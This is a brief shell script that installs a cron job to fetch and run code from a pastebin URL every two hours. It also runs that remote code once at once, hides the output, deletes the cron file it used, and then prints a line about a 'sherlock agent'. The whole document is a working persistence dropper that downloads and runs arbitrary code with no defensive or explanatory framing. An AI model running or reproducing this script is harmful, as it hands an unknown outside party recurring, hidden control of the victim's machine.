echo '0 */2 * * * /bin/sh -c "`curl -s https://pastebin.com/raw/9g7BUQ6b`" > /dev/null 2>&1' > cron.file && crontab cron.file && unlink cron.file

/bin/sh -c "`curl -s https://pastebin.com/raw/9g7BUQ6b`"

echo -e "Fin set sherlock agent \n\n"